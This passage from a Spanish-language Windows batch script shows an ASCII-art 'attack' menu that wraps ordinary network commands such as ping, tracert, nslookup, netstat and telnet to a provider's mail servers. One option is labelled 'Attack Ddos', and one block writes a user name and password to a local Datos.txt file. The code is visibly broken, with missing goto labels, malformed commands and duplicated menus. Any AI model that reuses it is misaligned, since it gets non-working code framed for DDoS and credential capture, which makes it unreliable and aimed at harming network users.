echo. ...111111111111111.1.111.. 5.  trazar el ping set /p d=tracert >> Datos.txt
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup >> Datos.txt
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25 >> Datos.txt
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110 >> Datos.txt
echo. .....11....1111.....11.... 9.  set /p d=netstat	 >> Datos.txt
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns >> Datos.txt
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	 >> Datos.txt
echo. .........111111111........ 12. set /p d=nslookup + set type=all >> Datos.txt
echo. .........1.1.1.1.1........ 13. Salir  >> Datos.txt
echo. ........11111111111.......				 >> Datos.txt
echo. .........111111111........				 >> Datos.txt		
echo. ..........1111111.........	 >> Datos.txt
echo.=================================================================== >> Datos.txt



pause
color 0C




color C
echo.
echo options
echo.===================================================================
echo. ........11111.1.1111...... 1.  ver los usuarios net user
echo. .....11111111.1.111111.... 2.  verificar la ipconfig/all
echo. ....1111111111.1.111111... 3.  hacer ping		
echo. ...1111111111111.1.11111.. 4.  Attack Ddos	
echo. ...111111111111111.1.111.. 5.  trazar el ping set /p d=tracert
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110
echo. .....11....1111.....11.... 9.  set /p d=netstat	
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	
echo. .........111111111........ 12. set /p d=nslookup + set type=all
echo. .........1.1.1.1.1........ 13. Salir 
echo. ........11111111111.......				
echo. .........111111111........						
echo. ..........1111111.........	
echo.===================================================================

@echo off
color A
set/p Attack= Escriba el número determinado y pulse ENTER.

color 0C
if %Attack%== 1 goto user
if %Attack%== 2 goto ipconfig/all
if %Attack%== 3 goto ping
if %Attack%== 4 goto AttackDdos
if %Attack%== 5 goto tracert
if %Attack%== 6 goto nslookup
if %Attack%== 7 goto telnet25
if %Attack%== 8 goto telnet110
if %Attack%== 9 goto netstat
if %Attack%== 10 goto nslookupsettypens
if %Attack%== 11 goto nslookupqmx
if %Attack%== 12 goto nslookupsettypeall
if %Attack%== 13 goto Salir
if %Attack%== %Attack% goto error
pause>nul

color 0C

:nslookupsettypeall
Start cmd.exe
set /p d=nslookup + set type=all
nslookup nslookup + set type=all %p% %d%

echo.===================================================================  >> Datos.txt
echo. ........11111.1.1111...... 1.  user: %users%   > Datos.txt
echo. .....11111111.1.111111.... 2.  Password:%Password% >> Datos.txt
echo. ....1111111111.1.111111... 3. Fecha:%date% >> Datos.txt
echo. ...1111111111111.1.11111.. 4.  Hora:%Time% >> Datos.txt
echo. ...111111111111111.1.111.. 5.   ping: %p% %d%>> Datos.txt
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup >> Datos.txt
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25 >> Datos.txt
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110 >> Datos.txt
echo. .....11....1111.....11.... 9.  set /p d=netstat	 >> Datos.txt
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns >> Datos.txt
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	 >> Datos.txt
echo. .........111111111........ 12. set /p d=nslookup + set type=all >> Datos.txt
echo. .........1.1.1.1.1........ 13. Salir  >> Datos.txt
echo. ........11111111111.......				 >> Datos.txt
echo. .........111111111........				 >> Datos.txt		
echo. ..........1111111.........	 >> Datos.txt
echo.=================================================================== >> Datos.txt


pause











color 0C
color 0C

:Salir
cls
exit
:error
cls
msg * La Opción que eligió no existe, pruebe con otra, Gracias.
goto buscador
exit
pause>nul








